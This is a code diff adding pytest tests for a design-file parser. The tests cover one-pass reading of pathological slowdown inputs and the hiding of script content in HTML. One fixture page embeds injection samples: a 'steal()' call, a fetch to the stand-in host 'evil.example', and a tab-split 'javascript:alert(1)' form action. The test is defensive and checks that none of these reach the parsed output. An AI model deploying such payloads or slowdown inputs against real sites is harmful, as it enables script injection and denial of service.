@@ -6,8 +6,11 @@ reported as an 'unparsed' Unit rather than raised."""
 from __future__ import annotations
 
 import ast
+import contextlib
 import os
 import random
+import re
+import signal
 import subprocess
 from pathlib import Path
 
@@ -997,3 +1000,140 @@ def test_arbitrary_and_truncated_text_never_raises(tmp_path):
             assert units == design.decompose(folder, ART)
             Artifact(source=SOURCE, kinds=("theme",), units=tuple(units))
             assert all(len(unit.body) <= MAX_BODY for unit in units)
+
+
+# --- repairs: linear-time reading, scripts that close themselves, token files -----------------
+
+
+class _TooSlow(BaseException):
+    """Raised by the timer: a BaseException, so the adapter's own handlers do not report it."""
+
+
+@contextlib.contextmanager
+def _within(seconds: float):
+    def expire(signum, frame):
+        raise _TooSlow(f"took longer than {seconds} seconds")
+
+    previous = signal.signal(signal.SIGALRM, expire)
+    signal.setitimer(signal.ITIMER_REAL, seconds)
+    try:
+        yield
+    finally:
+        signal.setitimer(signal.ITIMER_REAL, 0)
+        signal.signal(signal.SIGALRM, previous)
+
+
+def _filled(unit: str, prefix: str = "", suffix: str = "") -> str:
+    """unit repeated to fill the size bound of one file, between prefix and suffix."""
+    room = design.MAX_FILE_BYTES - len(prefix) - len(suffix)
+    return prefix + unit * (room // len(unit)) + suffix
+
+
+NESTED_CONSTS = 20_000
+
+# Each of these took minutes or more — a pattern searching to the end of the file from each of
+# thousands of places, or brackets paired again from each of thousands of places — and each is
+# now read in one pass.
+PATHOLOGICAL = [
+    ("sections/comments.liquid", _filled("{% comment %}")),
+    ("sections/statements.liquid", _filled("{% ")),
+    ("assets/theme.css.liquid", _filled("{{ ")),
+    ("Scripts.vue", _filled("<script>")),
+    ("Interfaces.tsx", _filled("interface A <")),
+    ("Types.tsx", _filled("type A <")),
+    ("Functions.tsx", _filled("function A <")),
+    ("Annotated.tsx", _filled("const A :")),
+    ("Generic.tsx", _filled("const A = f<")),
+    ("Runes.svelte", _filled("let {a}: ", "<script>", "</script>")),
+    ("durations.css", _filled("1", ":root { --z: ", "x; }")),
+    ("lengths.css", _filled("1", ":root { --z: #fff ", "x; }")),
+    ("Nested.tsx", "const A = (" * NESTED_CONSTS + ")" * NESTED_CONSTS + "\n"),
+]
+
+
+@pytest.mark.skipif(not hasattr(signal, "setitimer"), reason="needs an interval timer")
+@pytest.mark.parametrize(("rel", "content"), PATHOLOGICAL, ids=[rel for rel, _ in PATHOLOGICAL])
+def test_pathological_text_is_read_in_one_pass(tmp_path, rel, content):
+    assert len(content.encode("utf-8")) <= design.MAX_FILE_BYTES
+    _write(tmp_path, rel, content)
+    with _within(10):
+        units = design.decompose(tmp_path, ART)
+    assert units == design.decompose(tmp_path, ART)
+    assert all(len(unit.body) <= MAX_BODY for unit in units)
+
+
+def test_the_one_pass_readers_find_what_the_patterns_they_replace_found():
+    rng = random.Random(11)
+    statement = re.compile(r"\{%.*?%\}", re.S)
+    tag = re.compile(r"\{\{.*?\}\}|\{%.*?%\}", re.S)
+    block = re.compile(
+        r"\{%-?\s*(schema|javascript|stylesheet|style|comment)\s*-?%\}.*?\{%-?\s*end\1\s*-?%\}",
+        re.S,
+    )
+    script = re.compile(r"<script\b[^>]*>(.*?)</script\s*>", re.S | re.I)
+    pieces = ["{%", "%}", "{{", "}}", "{% comment %}", "{% endcomment %}", "{%- style -%}",
+              "{% endstyle %}", "<script>", "<SCRIPT type=x>", "</script>", "</script >", ">",
+              "a", "\n", " ", "(", ")", "[", "]", "{", "}"]
+    for _ in range(400):
+        text = "".join(rng.choice(pieces) for _ in range(rng.randrange(1, 40)))
+        assert design._blank_between(text, design._LIQUID_STATEMENTS) == statement.sub(design._blank, text)
+        assert design._blank_between(text, design._LIQUID_TAGS) == tag.sub(design._blank, text)
+        assert design._blank_blocks(text) == block.sub(design._blank, text)
+        assert design._script_blocks(text) == [
+            (match.start(1), match.end(1), match.end()) for match in script.finditer(text)
+        ]
+        code = design._Code(text, script=False)
+        for start in [index for index, char in enumerate(text) if char in "{[("]:
+            for end in (None, rng.randrange(start, len(text) + 1)):
+                assert _pairing(code, start, end) == _pairing_by_scan(text, start, end)
+
+
+def _pairing(code, start, end):
+    try:
+        return code.closing(start, end)
+    except design._Unbalanced as exc:
+        return (exc.opened, exc.found, exc.closer)
+
+
+def _pairing_by_scan(masked, start, end):
+    """The pairing as a fresh scan from start finds it: what code.closing must agree with."""
+    end = len(masked) if end is None else end
+    opened: list[int] = []
+    for match in re.finditer(r"[{}\[\]()]", masked[:end]):
+        if match.start() < start:
+            continue
+        char = match.group()
+        if char in "{[(":
+            opened.append(match.start())
+            continue
+        if not opened or {"{": "}", "[": "]", "(": ")"}[masked[opened[-1]]] != char:
+            return (opened[-1] if opened else match.start(), match.start(), char)
+        opened.pop()
+        if not opened:
+            return match.start()
+    return (start, end, None)
+
+
+def test_a_script_that_closes_itself_still_hides_what_follows_it(tmp_path):
+    _write(tmp_path, "index.html", (
+        "<html><head><title>Shop</title><script/>steal()</script></head>\n"
+        "<body><h1><script/>fetch('https://evil.example/x')</script>Welcome</h1>\n"
+        '<form action="java\tscript:alert(1)" method="post"><input name="q"></form>\n'
+        "</body></html>\n"
+    ))
+    [page] = design.decompose(tmp_path, ART)
+    assert page.title == "Page index.html: Shop"
+    assert "- line 2: h1 Welcome" in _lines(page)
+    assert 'action="(a script, not read)"' in page.body and 'method="post"' in page.body
+    for script in ("steal", "fetch", "evil.example", "alert"):
+        assert script not in page.body, script
+
+
+@pytest.mark.parametrize(("content", "held"), [
+    ("[1, 2]", "an array"), ('"#fff"', "a string"), ("7", "a number"), ("null", "null"),
+])
+def test_a_token_file_that_is_not_an_object_is_said_so_of(tmp_path, content, held):
+    _write(tmp_path, "tokens.json", content)
+    [unit] = design.decompose(tmp_path, ART)
+    assert unit.kind == "knowledge" and "unparsed" in unit.tags
+    assert f"holds {held}, not an object of tokens and groups" in unit.body
